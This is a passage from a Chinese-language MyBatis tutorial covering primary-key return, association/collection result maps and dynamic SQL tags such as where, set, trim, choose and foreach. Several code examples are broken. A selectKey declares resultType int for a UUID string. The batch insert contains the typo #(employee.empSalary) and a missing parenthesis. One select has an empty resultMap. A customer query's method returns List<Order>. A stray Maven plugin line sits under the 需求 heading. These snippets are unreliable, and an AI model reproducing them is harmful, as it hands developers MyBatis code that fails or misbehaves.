<p>使用示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(String name:employeeMapper.queryNamesBySalary(<span class="number">10.0</span>))&#123;</span><br><span class="line">    System.out.println(name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (Employee employee:employeeMapper.queryBySalary(<span class="number">10.0</span>))&#123;</span><br><span class="line">    System.out.println(employee);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="主键值-主键回显"><a href="#主键值-主键回显" class="headerlink" title="主键值(主键回显)"></a>主键值(主键回显)</h4><h5 id="自增型主键回显"><a href="#自增型主键回显" class="headerlink" title="自增型主键回显"></a>自增型主键回显</h5><p>接口方法示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">insertEmp</span><span class="params">(Employee employee)</span>;</span><br></pre></td></tr></table></figure>

<p>SQL编写示例：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">    useGeneratedKeys=&quot;true&quot;     需要自增长主键回显</span></span><br><span class="line"><span class="comment">    keyColumn=&quot;emp_id&quot;          emp_id列为自增长主键列</span></span><br><span class="line"><span class="comment">    keyProperty=&quot;empId&quot;         回显值存储到的属性</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">&quot;insertEmp&quot;</span> <span class="attr">useGeneratedKeys</span>=<span class="string">&quot;true&quot;</span> <span class="attr">keyColumn</span>=<span class="string">&quot;emp_id&quot;</span> <span class="attr">keyProperty</span>=<span class="string">&quot;empId&quot;</span>&gt;</span></span><br><span class="line">    insert into t_emp(emp_name,emp_salary) values(#&#123;empName&#125;,#&#123;empSalary&#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Employee</span> <span class="variable">employee</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Employee</span>();</span><br><span class="line"><span class="comment">// 其中id为自增主键值</span></span><br><span class="line">employee.setEmpName(<span class="string">&quot;tony&quot;</span>);</span><br><span class="line">employee.setEmpSalary(<span class="number">30000.0</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="variable">rows</span> <span class="operator">=</span> employeeMapper.insertEmp(employee);</span><br><span class="line">System.out.println(employee.getEmpId()); <span class="comment">// 回显主键回显到原来实体类对象的对应属性中</span></span><br></pre></td></tr></table></figure>



<h5 id="非自增长型主键MyBatis自生成并回显"><a href="#非自增长型主键MyBatis自生成并回显" class="headerlink" title="非自增长型主键MyBatis自生成并回显"></a>非自增长型主键MyBatis自生成并回显</h5><p>MyBatis可以帮助我们维护非自增长型主键。</p>
<p>接口方法示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">insertEmp</span><span class="params">(Employee employee)</span>;</span><br></pre></td></tr></table></figure>

<p>SQL编写示例：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">    &lt;insert标签中有&lt;selectKey子标签，在此标签内编写生成主键的SQL语句。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">&quot;insertEmp&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">		order=&quot;BEFORE | AFTER&quot; 子标签内SQL语句是在插入语句之前还是之后执行。</span></span><br><span class="line"><span class="comment">		resultType = 返回值类型</span></span><br><span class="line"><span class="comment">		keyProperty = 查询结果交给那个属性赋值。</span></span><br><span class="line"><span class="comment">	--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">selectKey</span> <span class="attr">order</span>=<span class="string">&quot;BEFORE&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;int&quot;</span> <span class="attr">keyProperty</span>=<span class="string">&quot;empId&quot;</span> &gt;</span></span><br><span class="line">    	select REPLACE(UUID(),&#x27;-&#x27;,&#x27;&#x27;);</span><br><span class="line">    <span class="tag">&lt;/<span class="name">selectKey</span>&gt;</span></span><br><span class="line">    insert into t_emp(emp_id,emp_name,emp_salary) values(#&#123;empId&#125;,#&#123;empName&#125;,#&#123;empSalary&#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Employee</span> <span class="variable">employee</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Employee</span>();</span><br><span class="line"><span class="comment">// 无需再为id赋值，MyBatis会自动生成</span></span><br><span class="line">employee.setEmpName(<span class="string">&quot;tony&quot;</span>);</span><br><span class="line">employee.setEmpSalary(<span class="number">30000.0</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="variable">rows</span> <span class="operator">=</span> employeeMapper.insertEmp(employee);</span><br><span class="line">System.out.println(employee.getEmpId()); <span class="comment">// 回显主键回显到原来实体类对象的对应属性中</span></span><br></pre></td></tr></table></figure>





<hr>
<h1 id="多表映射"><a href="#多表映射" class="headerlink" title="多表映射"></a>多表映射</h1><ol>
<li>多表查询的sql语句仍然需要我们自己编写</li>
<li>需要自己设计存储数据的结果，承接多表查询的结果</li>
<li>需要自己使用resultMap定义结果集映射。</li>
</ol>
<hr>
<h2 id="多表查询实体类设计"><a href="#多表查询实体类设计" class="headerlink" title="多表查询实体类设计"></a>多表查询实体类设计</h2><p>多表查询可以分为几类：</p>
<ul>
<li><p>对一（一对一）关系：类内包含单个对方对象类型作为属性</p>
</li>
<li><p>对多（一对一、一对多）关系：类内包含对方类型的集合作为属性</p>
<blockquote>
<p>只有真实发生多表查询时，才需要设计和修改实体类，不要提前设计和修改实体类</p>
<p>无论多少张表联查，实体类设计都是两两考虑的</p>
<p>在查询映射时，只需要关注本次查询相关的属性，无需处理实体类其他无关属性。</p>
</blockquote>
</li>
</ul>
<h2 id="对一映射"><a href="#对一映射" class="headerlink" title="对一映射"></a>对一映射</h2><p><strong>核心是编写SQL的xml中的</strong><code>&lt;association&gt;</code><strong>标签</strong></p>
<p>SQL编写示例：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;qoi&quot;</span> <span class="attr">type</span>=<span class="string">&quot;order&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">&quot;order_id&quot;</span> <span class="attr">property</span>=<span class="string">&quot;orderId&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;order_name&quot;</span> <span class="attr">property</span>=<span class="string">&quot;orderName&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;customer_id&quot;</span> <span class="attr">property</span>=<span class="string">&quot;customerId&quot;</span>/&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">对象型属性赋值：association标签：</span></span><br><span class="line"><span class="comment">property：对象属性名</span></span><br><span class="line"><span class="comment">javaType:对象所属类全限定符或别名</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">association</span> <span class="attr">property</span>=<span class="string">&quot;customer&quot;</span> <span class="attr">javaType</span>=<span class="string">&quot;customer&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">&quot;customer_id&quot;</span> <span class="attr">property</span>=<span class="string">&quot;customerId&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;customer_name&quot;</span> <span class="attr">property</span>=<span class="string">&quot;customerName&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">association</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--查询id对应的订单及订单对应客户信息--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;queryOrderById&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;qoi&quot;</span>&gt;</span></span><br><span class="line">  select * from t_order o join t_customer c</span><br><span class="line">      on o.customer_id = c.customer_id</span><br><span class="line">          where o.order_id = #&#123;id&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>接口方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Order <span class="title function_">queryOrderById</span><span class="params">(Integer id)</span>;</span><br></pre></td></tr></table></figure>

<p>实体类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Order</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Integer orderId;</span><br><span class="line">    <span class="keyword">private</span> String orderName;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Integer customerId;</span><br><span class="line">    <span class="keyword">private</span> Customer customer;<span class="comment">// 体现的是对一的关系</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="对多映射"><a href="#对多映射" class="headerlink" title="对多映射"></a>对多映射</h2><p>“多”对应的实体类的集合作为当前类的属性。</p>
<p><strong>核心是编写SQL的xml中的</strong><code>&lt;collection&gt;</code><strong>标签</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;qcoi&quot;</span> <span class="attr">type</span>=<span class="string">&quot;customer&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">&quot;customer_id&quot;</span> <span class="attr">property</span>=<span class="string">&quot;customerId&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;customer_name&quot;</span> <span class="attr">property</span>=<span class="string">&quot;customerName&quot;</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- collection标签，适用于集合属性</span></span><br><span class="line"><span class="comment">            property：集合属性名</span></span><br><span class="line"><span class="comment">            ofType: 集合元素所属类全限定符或别名</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">collection</span> <span class="attr">property</span>=<span class="string">&quot;orders&quot;</span> <span class="attr">ofType</span>=<span class="string">&quot;order&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">&quot;order_id&quot;</span> <span class="attr">property</span>=<span class="string">&quot;orderId&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;order_name&quot;</span> <span class="attr">property</span>=<span class="string">&quot;orderName&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;customer_id&quot;</span> <span class="attr">property</span>=<span class="string">&quot;customerId&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">collection</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;queryCustomerOrderById&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">    select * from t_customer c join t_order o</span><br><span class="line">        on c.customer_id = o.customer_id</span><br><span class="line">            where c.customer_id = #&#123;id&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>接口方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;Order&gt; <span class="title function_">queryCustomerOrderById</span><span class="params">(Integer id)</span>;</span><br></pre></td></tr></table></figure>

<p>实体类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Customer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Integer customerId;</span><br><span class="line">    <span class="keyword">private</span> String customerName;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Order&gt; orderList;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> List&lt;Order&gt; orders;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="总结和简化"><a href="#总结和简化" class="headerlink" title="总结和简化"></a>总结和简化</h2><p>如果我们开启了驼峰命名法自动映射（见【其他】），并且设置<code>autoMappingBehavior</code>为FULL后，只需要指明各层主键（即<code>&lt;id&gt;</code>）的映射，其他不需要：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;qcoi&quot;</span> <span class="attr">type</span>=<span class="string">&quot;customer&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">&quot;customer_id&quot;</span> <span class="attr">property</span>=<span class="string">&quot;customerId&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">collection</span> <span class="attr">property</span>=<span class="string">&quot;orders&quot;</span> <span class="attr">ofType</span>=<span class="string">&quot;order&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">&quot;order_id&quot;</span> <span class="attr">property</span>=<span class="string">&quot;orderId&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">collection</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>关联关系</th>
<th>配置项关键词</th>
<th>所在配置文件和具体位置</th>
</tr>
</thead>
<tbody><tr>
<td>对一</td>
<td>association标签&#x2F;javaType属性&#x2F;property属性</td>
<td>Mapper配置文件中的resultMap标签内</td>
</tr>
<tr>
<td>对多</td>
<td>collection标签&#x2F;ofType属性&#x2F;property属性</td>
<td>Mapper配置文件中的resultMap标签内</td>
</tr>
</tbody></table>
<p><code>association</code>和<code>collection</code>可以多层嵌套，如在一个客户对多个订单，一个订单包含多个订单项的情景中，应该：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;resultMap id=&quot;&quot; type=&quot;&quot;&gt;</span><br><span class="line">    &lt;id column=&quot;&quot; property=&quot;&quot;/&gt;</span><br><span class="line">    &lt;collection property=&quot;&quot; ofType=&quot;&quot;&gt;</span><br><span class="line">        &lt;id column=&quot;&quot; property=&quot;&quot;/&gt;</span><br><span class="line">         &lt;collection property=&quot;&quot; ofType=&quot;&quot;&gt;</span><br><span class="line">            &lt;id column=&quot;&quot; property=&quot;&quot;/&gt;</span><br><span class="line">        &lt;/collection&gt;</span><br><span class="line">    &lt;/collection&gt;</span><br><span class="line">&lt;/resultMap&gt;</span><br></pre></td></tr></table></figure>





<hr>
<h1 id="动态语句"><a href="#动态语句" class="headerlink" title="动态语句"></a>动态语句</h1><p><strong>需求：</strong></p>
<p>xxxxxxxxxx <groupId>org.springframework.boot</groupId><artifactId>spring-boot-maven-plugin</artifactId><version>3.0.5</version>xml</p>
<h2 id="标签-if-和-where"><a href="#标签-if-和-where" class="headerlink" title="标签 if 和 where"></a>标签 if 和 where</h2><p><code>&lt;if&gt;</code> 标签用于在SQL语句中添加条件判断。它允许你根据特定的条件来决定是否包含某些SQL片段。</p>
<p><code>&lt;where&gt;</code> 标签是MyBatis为了简化SQL语句编写的辅助标签。它能够自动处理<code>AND</code>和<code>OR</code>关键字，<strong>确保只有在有实际条件的时候才会添加<code>WHERE</code>子句</strong>，并且会自动<strong>去除</strong><code>WHERE</code>子句后面的多余<code>AND</code>或<code>OR</code>。</p>
<p>SQL编写示例：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;query&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;employee&quot;</span>&gt;</span></span><br><span class="line">    select * from t_emp</span><br><span class="line"><span class="comment">&lt;!-- if 和 where 标签编写一起使用。</span></span><br><span class="line"><span class="comment">    if：判断传入的参数，最终决定是否添加语句</span></span><br><span class="line"><span class="comment">        test属性：内部做比较运算，为true才会拼接标签内部语句。</span></span><br><span class="line"><span class="comment">    判断语句书写：“key 比较符号 值 [and/or key 比较符合 值]”</span></span><br><span class="line"><span class="comment">        &quot;&lt;&quot;和“&gt;&quot;推荐使用&quot;&amp;lt;&quot;和&quot;&amp;gt;&quot;代替</span></span><br><span class="line"><span class="comment">    where：</span></span><br><span class="line"><span class="comment">        1. 内部有任何一个if标签条件满足，自动条件&quot;where&quot;关键字以连接</span></span><br><span class="line"><span class="comment">        2. 自动去除多余的 and/or 关键字</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">where</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;name!=null&quot;</span>&gt;</span></span><br><span class="line">        emp_name = #&#123;name&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;salary != null and salary <span class="symbol">&amp;gt;</span> 0&quot;</span>&gt;</span></span><br><span class="line">        and emp_salary &gt; #&#123;salary&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">where</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>接口方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;Employee&gt; <span class="title function_">query</span><span class="params">(<span class="meta">@Param(&quot;name&quot;)</span> String name, <span class="meta">@Param(&quot;salary&quot;)</span> Double salary)</span>;</span><br></pre></td></tr></table></figure>

<p>调用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">EmpMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> session.getMapper(EmpMapper.class);</span><br><span class="line">    List&lt;Employee&gt; query = mapper.query(<span class="literal">null</span>, <span class="number">50.0</span>);</span><br><span class="line">    System.out.println(query);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="标签-set"><a href="#标签-set" class="headerlink" title="标签 set"></a>标签 set</h2><p>set标签可以代替更新时的set关键字，自动添加set关键字和<strong>增加或去除</strong>逗号，但必须有至少一个参数，否则语法必定错误</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">update</span> <span class="attr">id</span>=<span class="string">&quot;update&quot;</span>&gt;</span></span><br><span class="line">    update t_emp</span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">    只有name或salary不为null才更新数据</span></span><br><span class="line"><span class="comment">    int update(Employee employee);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    自动添加set关键字和增加或去除逗号</span></span><br><span class="line"><span class="comment">    必须有至少一个参数，否则语法必定错误</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">set</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;empName!=null&quot;</span>&gt;</span></span><br><span class="line">            emp_name = #&#123;empName&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;empSalary!=null&quot;</span>&gt;</span></span><br><span class="line">            emp_salary = #&#123;empSalary&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">set</span>&gt;</span></span><br><span class="line">    where emp_id = #&#123;empId&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">update</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="标签-trim-（了解）"><a href="#标签-trim-（了解）" class="headerlink" title="标签 trim （了解）"></a>标签 trim （了解）</h2><p>使用trim标签控制条件部分两端是否包含某些字符</p>
<ul>
<li>prefix属性：指定要动态添加的前缀</li>
<li>suffix属性：指定要动态添加的后缀</li>
<li>prefixOverrides属性：指定要动态去掉的前缀，使用“|”分隔有可能的多个值</li>
<li>suffixOverrides属性：指定要动态去掉的后缀，使用“|”分隔有可能的多个值</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;query&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;employee&quot;</span>&gt;</span></span><br><span class="line">    select * from t_emp</span><br><span class="line">    <span class="comment">&lt;!-- 使用 trim 替代 where --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">trim</span> <span class="attr">prefix</span>=<span class="string">&quot;where&quot;</span> <span class="attr">suffixOverrides</span>=<span class="string">&quot;and|or&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;name!=null&quot;</span>&gt;</span></span><br><span class="line">            emp_name = #&#123;name&#125; and  <span class="comment">&lt;!--注意这里有后缀and--&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;salary != null and salary <span class="symbol">&amp;gt;</span> 0&quot;</span>&gt;</span></span><br><span class="line">            emp_salary &gt; #&#123;salary&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">trim</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="标签-choose-when-otherwise"><a href="#标签-choose-when-otherwise" class="headerlink" title="标签 choose&#x2F;when&#x2F;otherwise"></a>标签 choose&#x2F;when&#x2F;otherwise</h2><p>在多个分支条件中，仅执行一个。相当于 switch (case  break) default </p>
<blockquote>
<p>从上到下依次执行条件判断，遇到的第一个满足条件的分支会被采纳<br>被采纳分支后面的分支都将不被考虑，如果所有的when分支都不满足，那么就执行otherwise分支</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;query&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;employee&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--优先按姓名查询，姓名为空按薪水查询，薪水为空查询全部--&gt;</span></span><br><span class="line">    select * from t_emp</span><br><span class="line">    where</span><br><span class="line">        <span class="tag">&lt;<span class="name">choose</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">when</span> <span class="attr">test</span>=<span class="string">&quot;name!=null&quot;</span>&gt;</span></span><br><span class="line">                emp_name = #&#123;name&#125;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">when</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">when</span> <span class="attr">test</span>=<span class="string">&quot;salary != null and salary <span class="symbol">&amp;gt;</span> 0&quot;</span>&gt;</span></span><br><span class="line">                emp_salary &gt; #&#123;salary&#125;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">when</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">otherwise</span>&gt;</span>1=1<span class="tag">&lt;/<span class="name">otherwise</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">choose</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="标签-foreach-批量操作"><a href="#标签-foreach-批量操作" class="headerlink" title="标签 foreach 批量操作"></a>标签 foreach 批量操作</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">// 按id批量查询</span></span><br><span class="line"><span class="comment">List&lt;Employee&gt; queryBatch(@Param(&quot;ids&quot;) List&lt;Integer&gt; id);</span></span><br><span class="line"><span class="comment">原sql相当于：select * from t_emp where emp_id in (1,2,3)</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;queryBatch&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;employee&quot;</span>&gt;</span></span><br><span class="line">    select * from t_emp where emp_id in</span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">     collection: @param表明的名称或使用arg顺序</span></span><br><span class="line"><span class="comment">     open：遍历之前需要追加的字符串</span></span><br><span class="line"><span class="comment">     close: 遍历结束需要添加到字符串</span></span><br><span class="line"><span class="comment">     separator: 每次遍历需要追加的分隔符</span></span><br><span class="line"><span class="comment">     item: 获取每个遍历项</span></span><br><span class="line"><span class="comment">     --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">collection</span>=<span class="string">&quot;ids&quot;</span> <span class="attr">open</span>=<span class="string">&quot;(&quot;</span> <span class="attr">separator</span>=<span class="string">&quot;,&quot;</span> <span class="attr">close</span>=<span class="string">&quot;)&quot;</span> <span class="attr">item</span>=<span class="string">&quot;id&quot;</span>&gt;</span></span><br><span class="line">        #&#123;id&#125;</span><br><span class="line">        <span class="comment">&lt;!--当执行时，会为语句添加&quot;()&quot;，然后遍历传入的集合，分别赋值给id，使用&quot;,&quot;分隔每个id，最后形成类似&quot;(1,2,3)&quot;--&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--// 批量插入</span></span><br><span class="line"><span class="comment">int insertBatch(@Param(&quot;employees&quot;) List&lt;Employee&gt; employees);</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">&quot;insertBatch&quot;</span>&gt;</span></span><br><span class="line">    insert into t_emp(emp_name,emp_salary) values</span><br><span class="line">    <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">collection</span>=<span class="string">&quot;employees&quot;</span> <span class="attr">separator</span>=<span class="string">&quot;,&quot;</span> <span class="attr">item</span>=<span class="string">&quot;employee&quot;</span>&gt;</span></span><br><span class="line">        (#&#123;employee.empName&#125;,#(employee.empSalary)</span><br><span class="line">    <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--// 批量更新 ==》 整体遍历 ==》相当于一个标签下多条语句，需要允许多语句执行</span></span><br><span class="line"><span class="comment">int updateBatch(@Param(&quot;employees&quot;) List&lt;Employee&gt; employees);</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">update</span> <span class="attr">id</span>=<span class="string">&quot;updateBatch&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">collection</span>=<span class="string">&quot;employees&quot;</span> <span class="attr">item</span>=<span class="string">&quot;emp&quot;</span>&gt;</span></span><br><span class="line">        update t_emp set emp_name = #&#123;emp.empName&#125;,emp_salary = #&#123;emp.empSalary&#125; where emp_id = #&#123;emp.empId&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">update</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果单个标签包含多个语句，需要更改url,添加<code>?allowMultiQueries=true</code>:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;jdbc:mysql://localhost:3306/test?allowMultiQueries=true&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>(会影响防注入机制，建议优化sql):</p>
